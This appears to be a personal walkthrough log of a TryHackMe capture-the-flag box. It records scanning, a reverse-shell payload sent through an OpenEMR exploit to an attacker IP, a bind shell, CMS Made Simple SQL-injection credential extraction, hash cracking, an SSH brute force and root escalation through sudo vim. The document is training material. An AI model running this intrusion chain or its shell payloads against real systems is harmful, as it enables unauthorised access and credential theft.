# https://tryhackme.com/room/easyctf

```bash
=================================
10.201.10.42 -- http://10.201.10.42 -- lin x32/x64
=================================

2025-08-14 15:07:52 -- ping -c 1 -W 5 10.201.10.42
64 bytes from 10.201.10.42: icmp_seq=1 ttl=60 time=144 ms

2025-08-14 15:07:56 -- sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan 10.201.10.42
PORT     STATE SERVICE VERSION                                              
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.0.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)

searchsploit vsftpd 3.0
vsftpd 3.0.3 - Remote Denial of Service   | multiple/remote/49719.py

searchsploit "Apache 2.4.18" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'

searchsploit "openemr 5.0" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
OpenEMR 5.0.1.3 - Remote Code Execution ( | php/webapps/45161.py

searchsploit "openssh 7" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
// no good options?

# GOING OPENEMR

nc -lvnp 9871
2025-08-14 15:29:55 -- python openemr_rce.py http://10.201.10.42/openemr-5_0_1_3 -u admin -p admin -c 'bash -i >& /dev/tcp/10.2.0.82/9871 0>&1'
// failed

2025-08-14 15:30:00 -- python openemr_rce.py http://10.201.10.42/openemr-5_0_1_3 -u admin -p admin -c 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 54321 > /tmp/f'
nc -nv 10.201.10.42 54321
// no luck

2025-08-14 15:49:18 -- gobuster dir --threads 20 --wordlist /usr/share/wordlists/dirb/common.txt --url http://10.201.10.42/
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/simple               (Status: 301) [Size: 313] [--> http://10.201.10.42/simple/]                                                                       
// now this looks promising CMS Made Simple version 2.2.8

2025-08-14 16:05:36 -- python2 cms_exploit.py -u http://10.201.10.42/simple
// stopped
2025-08-14 16:08:08 -- python2 cms_exploit.py --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt -u http://10.201.10.42/simple
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c75

2025-08-14 16:18:22 -- hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret  

sudo gunzip /usr/share/wordlists/rockyou.txt.gz
2025-08-14 16:18:22 -- hydra -t 4 -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.201.10.42:2222
[2222][ssh] host: 10.201.10.42   login: mitch   password: secret

2025-08-14 16:23:07 -- sshpass -p "secret" ssh -p 2222 mitch@10.201.10.42
sshpass -p "secret" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 mitch@10.201.10.42
// winner!

### SURVEY
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!/bin/bash'
root@Machine:/root# ls -l
total 4
-rw-r--r-- 1 root root 24 aug 17  2019 root.txt
// last flag
```